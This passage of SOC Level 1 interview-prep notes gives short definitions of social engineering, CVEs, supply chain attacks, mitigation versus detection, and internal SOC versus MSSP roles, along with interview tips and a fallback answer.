docs.text: People can be manipulated through social engineering, which is often an easier path in than breaking a hardened system directly. Examples: phishing, impersonation, malware downloads.

docs.title: 8. What is Social Engineering?
docs.text:
A technique where attackers manipulate human psychology — rather than exploiting a technical flaw — to gain access or information.

Key levers: trust, urgency, fear.

docs.title: 9. Common Human-Targeted Attacks
docs.text:
• Phishing
  • Malicious links/downloads
  • Deepfakes
  • Impersonation

Interview tip: name the category, then give one concrete example.

docs.title: 10. What Do Attackers Actually Want?
docs.text: Access. Once an attacker has access, they can steal data, deploy ransomware, or move laterally through the network.

docs.title: 11. Can an Attack Happen Without a User Involved?
docs.text: Yes — attackers can exploit system vulnerabilities or misconfigurations directly, with no user interaction required.

docs.title: 12. Vulnerability vs. Misconfiguration
docs.text:
The single most important distinction in this module:

Type Definition Fix Vulnerability A flaw in the software itself Patch Misconfiguration A human error in setup Reconfigure

docs.title: 13. What is a CVE?
docs.text: Common Vulnerabilities and Exposures — a unique identifier assigned to a publicly known security vulnerability, used to track and manage it across the industry.

docs.title: 14. What is a Supply Chain Attack?
docs.text: An attack where malicious code enters through trusted software, updates, or third-party libraries — meaning a single compromised vendor can affect every downstream user.

docs.title: 15. Mitigation vs. Detection
docs.text:
• Mitigation — reduces the chance an attack succeeds
  • Detection — identifies an attack that's already happening

"Even strong mitigation isn't complete on its own — detection matters because some attacks always get through."

docs.title: 16. Baseline Security Controls Worth Mentioning
docs.text:
• Patch management
  • Antivirus / EDR
  • Network access restrictions
  • Security awareness training

docs.title: 17. Internal SOC vs. MSSP
docs.text:
• Internal SOC — one organization, deeper context over time
  • MSSP — multiple clients, faster-paced, broader exposure

"MSSP work builds breadth faster; an internal SOC builds depth in one environment."

docs.title: Fallback Answer
docs.text:
If a question runs long or you get stuck mid-answer, land on this:

"As a SOC analyst, my role is to monitor alerts, investigate suspicious activity, and escalate incidents when necessary to protect the organization."

Part of the SOC Level 1 learning series.
